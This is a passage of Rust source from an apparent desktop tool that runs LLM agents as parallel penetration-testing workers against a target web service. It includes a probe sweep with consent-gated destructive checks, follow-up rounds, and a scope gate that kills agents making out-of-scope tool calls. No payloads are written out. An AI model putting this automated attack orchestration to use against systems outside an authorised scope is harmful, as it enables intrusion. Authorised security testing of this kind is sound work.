    let enforce = enforce_auth.map(|auth| ScopeEnforce { proc_key: proc_key.to_string(), auth });
    let mut oc = pump_pi_stdio(app, id, pipes, worker, tool_prefix, enforce);
    match app.state::<Procs>().0.lock().unwrap().remove(proc_key) {
        Some(mut c) => {
            if !c.wait().map(|st| st.success()).unwrap_or(false) {
                oc.failed = true;
            }
            oc
        }
        None => {
            oc.aborted = true;
            oc
        }
    }
}

/// 단일 실행 마감 — 완료 노트 + 상태 전이 (실행 중일 때만).
fn finalize_run(app: &AppHandle, id: &str, outcome: &PumpOutcome, engine_label: &str) {
    let ok = !outcome.failed && !outcome.aborted;
    // 실패 원인 한 줄 — 어느 프로바이더/모델이 거부했는지와 점검 경로를 함께 보여준다.
    let err_hint = if ok || outcome.aborted || outcome.blocked {
        String::new()
    } else {
        let p = read_session(app, id).map(|s| s.provider).unwrap_or_default();
        let model = get_settings(app.clone())
            .providers
            .get(p.trim())
            .map(|c| c.model.trim().to_string())
            .unwrap_or_default();
        let model_part = if model.is_empty() { String::new() } else { format!("/ {model}") };
        let detail = if outcome.error.is_empty() { String::new() } else { format!(" 마지막 오류: {}", outcome.error) };
        format!(
            " — provider '{p}'{model_part} 연결을 점검하세요 (설정(⚙) > 프로바이더 연결 테스트).{detail}"
        )
    };
    let ev2 = json!({ "type": "note", "text": if outcome.aborted {
        format!("[중지] {engine_label} 실행이 중단됐습니다.")
    } else if outcome.blocked {
        format!("[차단] scope 위반으로 {engine_label} 실행을 중단했습니다 — 🛡 인가 대상 관리에서 범위를 확인하세요.")
    } else if ok {
        format!("[완료] {engine_label} 종료.")
    } else {
        format!("[완료] {engine_label} 비정상 종료{err_hint}")
    }});
    let stamped = append_event(app, id, &ev2);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    if let Some(cur) = read_session(app, id) {
        if cur.status == "running" {
            let st = if ok { "done" } else { "error" };
            set_status(app, id, st);
            app.emit("engagement-status", json!({ "sessionId": id, "status": st })).ok();
        }
    }
}

/// prime-agent 단일 턴 — 스코프 스킬 주입 + 반응형 킬게이트 + 세션 dir 연속대화.
fn run_prime_agent(
    app: &AppHandle,
    id: &str,
    s: &Session,
    settings: &Settings,
    provider: &str,
) -> Result<(), String> {
    let mut instruction = turn_instruction(app, s, Engine::Prime);
    if s.diag && !s.host.trim().is_empty() {
        let sweep = run_p0_sweep(app, id, &s.host, s.port, &s.auth_cookie, s.danger_consent);
        instruction.push_str(&p0_evidence_block(&sweep, 6000));
    }

    let ev3 = json!({ "type": "note", "text": "[sys] 인가 게이트: 스코프 스킬 주입 + 반응형 킬게이트 — prime-agent 의 모든 툴 호출을 인가 목록으로 검사하고 위반 시 프로세스를 중단합니다(이 세션만)." });
    let stamped3 = append_event(app, id, &ev3);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped3 })).ok();

    // 동기 프리플라이트 — 바이너리 미설치면 즉시 Err.
    prime_agent_path()?;
    {
        let ev = json!({ "type": "note", "text": "[sys] prime-agent 턴 — Rust 하네스 직접 실행." });
        let stamped = append_event(app, id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }

    let prep = prepare_engine_run(app, id, Engine::Prime, settings, provider, "", "main", instruction, false)?;
    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
    app.state::<Procs>().0.lock().unwrap().insert(id.to_string(), child);
    set_status(app, id, "running");
    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();

    {
        let app = app.clone();
        let id = id.to_string();
        let prefix = prep.tool_prefix;
        let auth = prep.enforce_auth;
        thread::spawn(move || {
            let outcome = pump_and_wait(&app, &id, &id, pipes, None, prefix, auth);
            finalize_run(&app, &id, &outcome, "prime-agent");
        });
    }
    Ok(())
}

/// pi print 인자 조립 — run_prime·deep 워커·collector 공용.
/// (models.json 동기화 포함. pi 1.3.0 플래그: -e/--mode/--session-id/-p/--provider/--model/--api-key)
fn pi_cli_args(
    settings: &Settings,
    provider: &str,
    redcell: &str,
    piq: &str,
    instruction: String,
) -> Result<(PathBuf, Vec<String>, PathBuf), String> {
    let cli = prime_cli_path(redcell)?;
    let ext_path = PathBuf::from(redcell).join("prime-agent").join("index.ts");
    let mut args: Vec<String> = vec![
        "-e".into(),
        ext_path.to_string_lossy().into_owned(),
        "--mode".into(),
        "json".into(),
        "--session-id".into(),
        piq.to_string(),
        "-p".into(),
        instruction,
    ];
    args.push("--provider".into());
    args.push(provider.to_string());
    let conn = settings.providers.get(provider).cloned().unwrap_or_default();
    // lge-aigw 는 키를 카드에 직접 붙여넣는다 — 비어 있으면 pi 가 placeholder 키로
    // 요청을 보내 401 이 나므로, 실행 전에 붙잡고 붙여넣을 곳을 안내한다.
    if provider == "lge-aigw" && conn.api_key.trim().is_empty() {
        return Err(
            "lge-aigw API 키가 비어 있습니다 — 설정(⚙) > 프로바이더 > lge-aigw 카드에 Databricks 토큰(터미널 `ug auth-token` 출력)을 붙여넣고 연결 저장을 누르세요.".into(),
        );
    }
    // 커스텀/로컬/내장 게이트웨이(pi 기본 카탈로그에 없음): models.json 에 병합해
    // pi 가 프로바이더·키(bang 명령 포함)를 알도록 항상 동기화한다.
    if needs_models_json_sync(provider) {
        let mpath = pi_models_json_path()?;
        sync_pi_models_json_at(&mpath, provider, &sync_base_url(provider, &conn), &conn.api_key, &conn.model, &sync_api(provider, &conn))?;
    }
    // 모델 지정: custom/ollama 도 --model 로 명시( pi 모델 패턴 "provider/id" 또는 순수 id ).
    {
        let m = conn.model.trim().to_string();
        if !m.is_empty() {
            args.push("--model".into());
            args.push(if provider == "custom" || provider == "ollama" { m } else { format!("{provider}/{m}") });
        } else {
            // 모델 미지정 — 카탈로그 기본 모델로 폴백(custom 은 기본이 없다).
            if let Some(d) = PROVIDER_CATALOG.iter().find(|x| x.name == provider) {
                if !d.default_model.is_empty() && provider != "custom" {
                    let d = d.default_model.to_string();
                    args.push("--model".into());
                    args.push(if needs_models_json_sync(provider) { d } else { format!("{provider}/{d}") });
                }
            }
        }
    }
    // 키: CLI --api-key 가 pi 해석 1순위(GUI 환경에선 env 가 안 보일 수 있어 가장 확실).
    // 단 `!명령` 키(pi !command)는 models.json 에만 살고 CLI 로 넘기지 않는다.
    if !conn.api_key.trim().is_empty() && !conn.api_key.trim_start().starts_with('!') {
        args.push("--api-key".into());
        args.push(conn.api_key.trim().to_string());
    }
    Ok((cli, args, prime_cwd(redcell)))
}

struct PiPipes {
    out: BufReader<ChildStdout>,
    err: BufReader<ChildStderr>,
}

/// 엔진 자식 프로세스 스폰 — REDCELL_GATE=1 + 프로바이더 env 주입 (+ 추가 env).
fn launch_child(
    prog: &Path,
    args: &[String],
    cwd: &Path,
    provider: &str,
    settings: &Settings,
    extra_env: &[(&str, &str)],
    err_hint: &str,
) -> Result<(Child, PiPipes), String> {
    let mut cmd = Command::new(prog);
    cmd.current_dir(cwd);
    cmd.args(args);
    // 인가 게이트 명시 활성화: pi 확장의 tool_call 훅이 이 세션에서만 fail-closed 로 동작한다.
    cmd.env("REDCELL_GATE", "1");
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
    if let Some(conn) = settings.providers.get(provider) {
        inject_provider_env(&mut cmd, provider, conn);
    }
    hide_window(&mut cmd);
    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("{err_hint}: {e}"))?;
    let out = child.stdout.take().map(BufReader::new).ok_or("stdout 파이프 실패")?;
    let err = child.stderr.take().map(BufReader::new).ok_or("stderr 파이프 실패")?;
    Ok((child, PiPipes { out, err }))
}


/// 심층 진단 워커 태그 — 이벤트에 worker id 를 찍고 UI 칩과 연결한다.
#[derive(Clone)]
struct WorkerTag {
    id: String,
    label: String,
}

/// 노트 1건 저장 + 프론트 전송 (워커 태그가 있으면 접두 + worker 필드).
fn emit_note(app: &AppHandle, id: &str, text: String, worker: Option<&WorkerTag>) {
    let ev = match worker {
        Some(w) => json!({ "type": "note", "text": format!("[{}] {}", w.label, text), "worker": w.id }),
        None => json!({ "type": "note", "text": text }),
    };
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
}

#[derive(Default)]
#[allow(dead_code)] // settled: 프로토콜 완성도용 플래그 (완료 판정은 failed/aborted+exit)
struct PumpOutcome {
    text: String, // 어시스턴트 텍스트 전체 누적 (워커 발견·collector 입력용)
    failed: bool, // stopReason=error / exit≠0 계열
    aborted: bool, // stopReason=aborted / settled(aborted) / 중지 kill
    settled: bool, // agent_settled 수신 (pi 1.3 정식 완료 신호)
    blocked: bool, // 반응형 스코프 게이트 발동 (인가 밖 툴 호출로 kill)
    error: String, // 마지막 LLM/실행 오류 메시지 — 사전 점검·마감 안내에 쓴다
}

/// 반응형 스코프 게이트 — prime-agent 엔진용. tool_execution_start 를 볼 때마다
/// 인가를 판정하고, 위반이면 레지스트리의 자식을 즉시 kill 한다.
#[derive(Clone)]
struct ScopeEnforce {
    proc_key: String,
    auth: auth::AuthList,
}

/// 어시스턴트 텍스트 1건 확정 — 중복 노트 방지 + outcome 누적 + 전송.
fn flush_assistant_text(
    app: &AppHandle,
    id: &str,
    t: &str,
    worker: Option<&WorkerTag>,
    outcome: &mut PumpOutcome,
    last_text: &mut Option<String>,
) {
    let t = t.trim().to_string();
    if t.is_empty() || last_text.as_deref() == Some(t.as_str()) {
        return;
    }
    if !outcome.text.is_empty() {
        outcome.text.push_str("\n\n");
    }
    outcome.text.push_str(&t);
    emit_note(app, id, t.clone(), worker);
    *last_text = Some(t);
}

/// tool_execution_end.result → 한 줄 요약 (content 첫 텍스트 우선, 없으면 details).
fn tool_result_summary(ev: &Value) -> String {
    let r = ev.get("result");
    let txt = r
        .and_then(|r| r.get("content"))
        .and_then(|c| c.as_array())
        .and_then(|a| {
            a.iter()
                .find_map(|p| p.get("text").and_then(|t| t.as_str()).map(|s| s.to_string()))
        })
        .or_else(|| {
            r.and_then(|r| r.get("details")).map(|d| {
                if let Some(s) = d.as_str() {
                    s.to_string()
                } else {
                    d.to_string()
                }
            })
        })
        .unwrap_or_default();
    let t = txt.split_whitespace().collect::<Vec<_>>().join(" ");
    let t: String = t.chars().take(160).collect();
    if t.is_empty() {
        String::new()
    } else {
        format!(" — {t}")
    }
}

/// pi/prime-agent json 이벤트 스트림 펌프 — stdout 은 인라인, stderr 는 내부 스레드.
/// pi 1.3.0 json 프로토콜(docs/json.md) 기준 (prime-agent 0.10 실측 동일):
///   text_delta/text_end + tool_execution_start/end + message_end(stopReason) + agent_settled.
///   최상위 {"type":"error"} 이벤트는 존재하지 않는다 — 실패는 message_end 의
///   stopReason=error|aborted + errorMessage, stderr, exit 코드로 판단한다.
/// `tool_prefix` 는 툴 노트 표시 ("pi-툴" | "prime-툴"). `enforce` 가 있으면
/// tool_execution_start 마다 scope 를 판정하고 위반 시 자식을 kill 한다.
fn pump_pi_stdio(
    app: &AppHandle,
    id: &str,
    pipes: PiPipes,
    worker: Option<WorkerTag>,
    tool_prefix: &str,
    enforce: Option<ScopeEnforce>,
) -> PumpOutcome {
    let PiPipes { out, err } = pipes;
    // stderr → [sys] 노트(모델/스코프 로그·print 모드 오류).
    let err_handle = {
        let app = app.clone();
        let id = id.to_string();
        let worker = worker.clone();
        thread::spawn(move || {
            for line in err.lines().map_while(Result::ok) {
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }
                emit_note(&app, &id, format!("[sys] {line}"), worker.as_ref());
            }
        })
    };

    let mut outcome = PumpOutcome {
        text: String::new(),
        failed: false,
        aborted: false,
        settled: false,
        blocked: false,
        error: String::new(),
    };
    let mut buf = String::new();
    let mut last_text: Option<String> = None; // text_end/message_end 중복 노트 방지
    for line in out.lines().map_while(Result::ok) {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let ev: Value = serde_json::from_str(line).unwrap_or_else(|_| json!({ "raw": line }));
        let ty = ev.get("type").and_then(|t| t.as_str()).unwrap_or("");
        match ty {
            "tool_execution_start" => {
                let name = ev.get("toolName").and_then(|n| n.as_str()).unwrap_or("tool");
                let args_val = ev.get("args").cloned().unwrap_or(Value::Null);
                let a = args_val.to_string();
                let a = a.chars().take(120).collect::<String>();
                emit_note(app, id, format!("[{tool_prefix}] {name} {a}"), worker.as_ref());
                // 반응형 스코프 게이트 (prime-agent 엔진): 위반이면 즉시 kill.
                if let Some(enf) = enforce.as_ref() {
                    if !outcome.blocked {
                        if let Some(reason) = decide_tool_violation(&enf.auth, name, &args_val) {
                            let killed = app
                                .state::<Procs>()
                                .0
                                .lock()
                                .unwrap()
                                .get_mut(&enf.proc_key)
                                .map(|c| c.kill().is_ok())
                                .unwrap_or(false);
                            outcome.failed = true;
                            outcome.blocked = true;
                            emit_note(
                                app,
                                id,
                                format!("[차단] {reason} (프로세스 중단{}).", if killed { "됨" } else { " 시도" }),
                                worker.as_ref(),
                            );
                        }
                    }
                }
            }
            "tool_execution_end" => {
                let name = ev.get("toolName").and_then(|n| n.as_str()).unwrap_or("tool");
                let is_err = ev.get("isError").and_then(|v| v.as_bool()).unwrap_or(false);
                let dur = ev
                    .get("durationMs")
                    .and_then(|v| v.as_u64())
                    .map(|ms| format!(" {ms}ms"))
                    .unwrap_or_default();
                let summary = tool_result_summary(&ev);
                let mark = if is_err { "✗" } else { "✓" };
                emit_note(app, id, format!("[{tool_prefix}{mark}] {name}{dur}{summary}"), worker.as_ref());
            }
            "message_update" => {
                if let Some(ae) = ev.get("assistantMessageEvent") {
                    match ae.get("type").and_then(|t| t.as_str()) {
                        Some("text_delta") => {
                            if let Some(d) = ae.get("delta").and_then(|d| d.as_str()) {
                                buf.push_str(d);
                            }
                        }
                        Some("text_end") => {
                            let b = buf.clone();
                            flush_assistant_text(app, id, &b, worker.as_ref(), &mut outcome, &mut last_text);
                            buf.clear();
                        }
                        _ => {}
                    }
                }
            }
            "message_end" => {
                if let Some(m) = ev.get("message") {
                    match m.get("stopReason").and_then(|r| r.as_str()) {
                        Some("error") => {
                            outcome.failed = true;
                            let msg = m
                                .get("errorMessage")
                                .and_then(|e| e.as_str())
                                .unwrap_or("pi 요청 실패")
                                .to_string();
                            outcome.error = msg.clone();
                            emit_note(app, id, format!("[오류] {msg}"), worker.as_ref());
                        }
                        Some("aborted") => {
                            outcome.aborted = true;
                            emit_note(app, id, "[중지] pi 실행이 중단됐습니다.".to_string(), worker.as_ref());
                        }
                        _ => {}
                    }
                    if m.get("role").and_then(|r| r.as_str()) == Some("assistant") {
                        if let Some(content) = m.get("content").and_then(|c| c.as_array()) {
                            for part in content {
                                if part.get("type").and_then(|t| t.as_str()) == Some("text") {
                                    if let Some(t) = part.get("text").and_then(|t| t.as_str()) {
                                        flush_assistant_text(app, id, t, worker.as_ref(), &mut outcome, &mut last_text);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            "agent_settled" => {
                outcome.settled = true;
                if ev.get("aborted").and_then(|v| v.as_bool()).unwrap_or(false) {
                    outcome.aborted = true;
                    emit_note(app, id, "[중지] pi settled(aborted).".to_string(), worker.as_ref());
                }
            }
            "error" => {
                // 레거시 폴백 — 현 프로토콜에 최상위 error 는 없지만 무시하지 않는다.
                outcome.failed = true;
                let text = ev.get("error").and_then(|e| e.as_str()).unwrap_or("pi 오류").to_string();
                outcome.error = text.clone();
                emit_note(app, id, format!("[오류] {text}"), worker.as_ref());
            }
            _ => {}
        }
    }
    if !buf.trim().is_empty() {
        let b = buf.clone();
        flush_assistant_text(app, id, &b, worker.as_ref(), &mut outcome, &mut last_text);
    }
    let _ = err_handle.join();
    outcome
}

/// 실행 전 공통 검증 — 세션/프로바이더/실행중복/redcell 경로.
fn engagement_precheck(app: &AppHandle, id: &str) -> Result<(Session, Settings, String, String), String> {
    let s = read_session(app, id).ok_or("세션을 찾을 수 없습니다")?;
    // 프로바이더 설정 없으면 거부 — mock 은 제거됨(데스크톱은 명시적 설정만).
    let provider = s.provider.trim();
    if provider.is_empty() || provider == "mock" {
        return Err("provider 가 설정되지 않았습니다 — 설정(⚙) > 프로바이더에서 API 키/연결을 설정하세요.".into());
    }
    let provider = provider.to_string();
    // 앱이 죽었다 다시 켜진 경우 등: 상태가 running 이어도 실제 실행 프로세스가 없으면
    // 재실행을 허용한다(레지스트리 기준 — 워커 키 `{id}#w{n}` 포함).
    let truly_running = app
        .state::<Procs>()
        .0
        .lock()
        .unwrap()
        .keys()
        .any(|k| k == id || k.starts_with(&format!("{id}#")));
    if s.status == "running" && truly_running {
        return Err("이미 실행 중인 세션입니다".into());
    }
    let settings = get_settings(app.clone());
    let redcell = settings.redcell_dir.clone();
    // redcell 경로(-e 확장 로드용)는 pi 엔진에서만 필수. prime-agent 는 스킬 주입이라 불필요.
    if session_engine(&s) == Engine::Pi
        && (redcell.trim().is_empty() || !Path::new(&redcell).join("src/cli.ts").exists())
    {
        return Err(format!(
            "redcell 경로를 찾을 수 없습니다: '{redcell}'. 설정(⚙)에서 redcell_dir 을 지정하세요."
        ));
    }
    Ok((s, settings, redcell, provider))
}

/// P0 스윕 실행 + 증거 저장 + 상태 이벤트 — 심층/단일 진단 공용.
/// 스윕 실패(대상 다운 등)해도 빈 증거로 계속 진행한다 (LLM 자체 정찰로 보완).
fn run_p0_sweep(app: &AppHandle, id: &str, host: &str, port: Option<u16>, cookie: &str, danger: bool) -> probes::ProbeReport {
    let ev = json!({ "type": "worker_status", "worker": "p0", "label": "P0·스윕", "title": "자동 스윕", "state": "running" });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    if danger {
        let ev = json!({ "type": "note", "text": "[경고] P0 파괴적 프로브 실행 — 기본자격·IDOR 인접·쓰기 검증 (사용자 동의 기반)" });
        let stamped = append_event(app, id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }
    let mut cfg = probes::SweepConfig::default();
    if !cookie.trim().is_empty() {
        cfg.cookie = Some(cookie.trim().to_string());
    }
    cfg.danger = danger;
    let rep = probes::run_sweep_with_config(host, port, cfg);
    // 증거 전문 저장 (세션당 최신 1건).
    {
        let guard = app.state::<IoGuard>();
        let _lock = guard.0.lock().unwrap();
        let p = sessions_dir(app).join(format!("probe-{id}.json"));
        if let Ok(txt) = serde_json::to_string_pretty(&rep) {
            fs::write(p, txt).ok();
        }
    }
    let line = probes::sweep_summary_line(&rep);
    let ev = json!({ "type": "note", "text": line });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    let ev = json!({ "type": "worker_status", "worker": "p0", "label": "P0·스윕", "title": "자동 스윕", "state": "done" });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    rep
}

/// P0 증거 주입 블록 — 워커/collector/단일 진단 지시문 끝에 덧붙인다.
fn p0_evidence_block(rep: &probes::ProbeReport, cap_chars: usize) -> String {
    format!(
        "\n\n## P0 자동 스윕 증거 (실측 확정 — ID 인용 필수)\n{}\n규칙: 위 [P-###] 증거는 확정 실측이다. 관련 시나리오에 ID를 반드시 인용하고, 이미 커버된 항목은 재프로브하지 말고 체인·악용 추론과 빈틈 보완에 집중하라.",
        probes::evidence_digest(rep, cap_chars)
    )
}

/// pi 연속대화 세션 id 보장 (run_prime·deep 공용).
fn ensure_piq(app: &AppHandle, s: &Session) -> Session {
    if !s.piq.trim().is_empty() {
        return s.clone();
    }
    let mut s2 = s.clone();
    let id8 = s2.id.chars().take(8).collect::<String>();
    s2.piq = format!("rc-{id8}");
    write_session_locked(app, &s2);
    s2
}

/// 대상 URL 조합 (포트 → http/https).
fn target_url(host: &str, port: Option<u16>) -> String {
    match port {
        Some(p) if p == 443 || p == 8443 => format!("https://{host}/"),
        Some(p) => format!("http://{host}:{p}/"),
        None => format!("http://{host}/"),
    }
}

fn https_hint_for(host: &str, port: Option<u16>) -> String {
    match port {
        Some(p) if p != 443 && p != 8443 => {
            format!("https://{host}:{p}/ 로도 접속을 시도해볼 것(둘 다 확인).")
        }
        _ => String::new(),
    }
}

/// 심층 진단 — 워커 5개를 독립 pi 세션으로 동시에 실행한 뒤 collector 가 병합.
/// prime-agent builder(factory) 패턴의 RedCell 구현: 병렬 섹션 작성자 + fan-in 병합.
/// 즉시 반환하며, 진행은 `engagement-event`(worker_status·노트)/`engagement-status` 로 전달된다.
#[tauri::command]
fn start_deep_diagnosis(app: AppHandle, id: String) -> Result<(), String> {
    let (s, settings, redcell, provider) = engagement_precheck(&app, &id)?;
    if s.host.trim().is_empty() {
        return Err("심층 진단은 대상 host/URL 이 필요합니다 — 위에 URL 을 입력하세요.".into());
    }
    gate_session_instruction(&app, &id, &s)?;
    // 심층 플래그 확정 (결과 탭이 진단 리포트로 렌더되도록 diag 도 함께).
    {
        let guard = app.state::<IoGuard>();
        let _lock = guard.0.lock().unwrap();
        let p = session_file(&app, &id);
        if let Some(mut cur) = fs::read_to_string(&p)
            .ok()
            .and_then(|t| serde_json::from_str::<Session>(&t).ok())
        {
            cur.deep = true;
            cur.diag = true;
            cur.updated_at = now();
            if let Ok(txt) = serde_json::to_string_pretty(&cur) {
                fs::write(p, txt).ok();
            }
        }
    }
    let s = ensure_piq(&app, &s);
    let piq = s.piq.clone();
    let target = target_url(&s.host, s.port);
    let https_hint = https_hint_for(&s.host, s.port);
    let goal = if s.goal.trim().is_empty() {
        "이 서비스의 보안 진단 리포트를 작성해줘.".to_string()
    } else {
        s.goal.trim().to_string()
    };
    let mem = memory_block(&app, &s.host);
    let engine = session_engine(&s);
    let engine_label = if engine == Engine::Prime { "prime-agent" } else { "pi" };
    // 동기 프리플라이트 — 엔진 바이너리 미설치면 즉시 Err.
    if engine == Engine::Prime {
        prime_agent_path()?;
    } else {
        prime_cli_path(&redcell)?;
    }
    // LLM 사전 점검 — 프로바이더가 죽어 있으면 워커 5개가 전부 실패하기 전에
    // 여기서 원인(400/401/타임아웃)을 한 번에 보여주고 즉시 중단한다.
    preflight_llm_check(&app, &id, engine, &settings, &provider, &redcell, &piq)?;
    {
        let ev = json!({ "type": "note", "text": format!("[sys] 모델 연결 확인 완료({provider}) — 심층 진단을 시작합니다.") });
        let stamped = append_event(&app, &id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }
    // 방어 상태 노트 — 워커마다 반복되지 않게 실행당 1회만.
    {
        let auth = auth::load(&resolve_app_auth_path(&app));
        if auth.yaml {
            let ev = json!({ "type": "note", "text": "[sys] 경고: 인가 파일이 정식 YAML 이라 prime-agent 반응형 킬게이트가 동작하지 않습니다 — 선행 차단(세션 대상 단일 호스트)으로 강제됩니다." });
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
        }
        let nf = netfilter_extra_env(&app, &id, &auth, &provider, &settings);
        emit_netfilter_note(&app, &id, !nf.is_empty());
    }

    set_status(&app, &id, "running");
    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();
    {
        let ev = json!({ "type": "note", "text": format!("[sys] 심층 진단 시작({engine_label}) — 5개 분야 워커를 동시에 실행합니다(정찰·주입·인증·노출·로직).") });
        let stamped = append_event(&app, &id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }

    thread::spawn(move || {
        // P0: 결정적 대량 스윕을 먼저 실행하고 증거를 워커·collector 에게 나눠준다.
        let sweep = run_p0_sweep(&app, &id, &s.host, s.port, &s.auth_cookie, s.danger_consent);
        // P0 도중 중지됐으면 워커를 띄우지 않고 마감한다 (stop_engagement 가 이미 stopped 처리).
        if read_session(&app, &id).map(|s| s.status == "stopped").unwrap_or(true) {
            return;
        }
        let digest_w = p0_evidence_block(&sweep, 6000);
        let digest_c = p0_evidence_block(&sweep, 12000);
        // 워커 1라운드 실행 클로저 — round 0 = 초동, 1+ = 추적 (동일 세션 연속).
        let run_round = |round: u32, ctx: &std::collections::HashMap<String, (String, String)>| -> Vec<(String, PumpOutcome)> {
            for def in DEEP_WORKERS {
                let ev = json!({ "type": "worker_status", "worker": def.id, "title": def.title, "label": def.label, "state": "running" });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            let mut handles = Vec::new();
            for def in DEEP_WORKERS {
                let app = app.clone();
                let id = id.clone();
                let settings = settings.clone();
                let redcell = redcell.clone();
                let provider = provider.clone();
                let piq = piq.clone();
                let target = target.clone();
                let goal = goal.clone();
                let https_hint = https_hint.clone();
                let mem = mem.clone();
                let digest_w = digest_w.clone();
                let (own_prior, cross) = ctx.get(def.id).cloned().unwrap_or_default();
                handles.push(thread::spawn(move || -> (String, PumpOutcome) {
                    let tag = WorkerTag { id: def.id.to_string(), label: def.label.to_string() };
                    let mut instruction = if round == 0 {
                        let mut i = deep_worker_instruction(def, &target, &goal, &https_hint, &mem);
                        i.push_str(&digest_w);
                        i
                    } else {
                        deep_followup_instruction(def, round + 1, &own_prior, &cross, &target)
                    };
                    if engine == Engine::Prime {
                        instruction = prime_adapt(instruction);
                    }
                    // 라운드가 바뀌어도 세션은 유지 (pi session-id / prime session-dir 연속).
                    let run_tag = if engine == Engine::Prime { def.id.to_string() } else { format!("{piq}-{}", def.id) };
                    let key = format!("{id}#{}", def.id);
                    let outcome = match prepare_engine_run(&app, &id, engine, &settings, &provider, &redcell, &run_tag, instruction, true) {
                        Ok(prep) => match spawn_prepared(&prep, &provider, &settings) {
                            Ok((child, pipes)) => {
                                app.state::<Procs>().0.lock().unwrap().insert(key.clone(), child);
                                pump_and_wait(&app, &id, &key, pipes, Some(tag.clone()), prep.tool_prefix, prep.enforce_auth)
                            }
                            Err(e) => {
                                emit_note(&app, &id, format!("[오류] {e}"), Some(&tag));
                                PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
                            }
                        },
                        Err(e) => {
                            emit_note(&app, &id, format!("[오류] {e}"), Some(&tag));
                            PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
                        },
                    };
                    let state = if outcome.aborted { "stopped" } else if outcome.failed { "error" } else { "done" };
                    let ev = json!({ "type": "worker_status", "worker": def.id, "title": def.title, "label": def.label, "state": state });
                    let stamped = append_event(&app, &id, &ev);
                    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
                    (def.id.to_string(), outcome)
                }));
            }
            let mut out: Vec<(String, PumpOutcome)> = handles
                .into_iter()
                .map(|h| {
                    h.join().unwrap_or_else(|_| {
                        ("w?".into(), PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: "워커 스레드 패닉".into() })
                    })
                })
                .collect();
            out.sort_by(|a, b| a.0.cmp(&b.0));
            out
        };
        let is_stopped = |results: &[(String, PumpOutcome)]| -> bool {
            read_session(&app, &id).map(|s| s.status == "stopped").unwrap_or(false)
                || results.iter().any(|(_, o)| o.aborted)
        };
        // agentic loop — 1차 → (신규 발견이 있으면) 추적 라운드, 수렴 시 조기 종료.
        let mut accum: std::collections::HashMap<String, String> = std::collections::HashMap::new();
        let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
        let mut results = run_round(0, &std::collections::HashMap::new());
        for (wid, o) in &results {
            if !o.failed {
                accum.insert(wid.clone(), o.text.clone());
                for k in extract_finding_keys(&o.text) {
                    seen.insert(k);
                }
            }
        }
        // 1라운드 전체 실패 = 프로바이더 연결 문제 — 추적 라운드·collector 는 시도할 가치가
        // 없다. "수렴" 으로 포장하지 말고 원인을 그대로 보여주고 즉시 마감한다.
        if !results.is_empty() && results.iter().all(|(_, o)| o.failed) {
            let detail = results
                .iter()
                .find_map(|(_, o)| if o.error.is_empty() { None } else { Some(o.error.clone()) })
                .unwrap_or_default();
            let why = classify_ping_failure(&settings, &provider, &detail);
            let ev = json!({ "type": "note", "text": format!(
                "[오류] 모든 워커가 모델 호출에 실패해 심층 진단을 중단합니다.\n{why}"
            )});
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            if read_session(&app, &id).map(|s| s.status == "running").unwrap_or(false) {
                set_status(&app, &id, "error");
                app.emit("engagement-status", json!({ "sessionId": id, "status": "error" })).ok();
            }
            return;
        }
        let mut rounds_run: u32 = 1;
        for round in 1..DEEP_MAX_ROUNDS {
            if is_stopped(&results) {
                break;
            }
            // 추적 컨텍스트 — 자가 누적 + 타 워커 신규 키 (교차 단서).
            let mut ctx: std::collections::HashMap<String, (String, String)> = std::collections::HashMap::new();
            let mut leads = 0usize;
            for def in DEEP_WORKERS {
                let own = accum.get(def.id).cloned().unwrap_or_default();
                let mut cross_lines: Vec<String> = Vec::new();
                for (wid, o) in &results {
                    if wid == def.id || o.failed {
                        continue;
                    }
                    for k in extract_finding_keys(&o.text) {
                        if seen.contains(&k) {
                            continue;
                        }
                        cross_lines.push(format!("- [단서:{wid}] {k}"));
                        if cross_lines.len() >= 6 {
                            break;
                        }
                    }
                    if cross_lines.len() >= 6 {
                        break;
                    }
                }
                leads += cross_lines.len();
                ctx.insert(def.id.to_string(), (own, cross_lines.join("\n")));
            }
            {
                let ev = json!({ "type": "note", "text": format!("[sys] 추적 라운드 {} 시작 — 교차 단서 {leads}건 추적.", round + 1) });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            results = run_round(round, &ctx);
            rounds_run += 1;
            let mut new_n = 0usize;
            for (wid, o) in &results {
                if o.failed {
                    continue;
                }
                for k in extract_finding_keys(&o.text) {
                    if seen.insert(k) {
                        new_n += 1;
                    }
                }
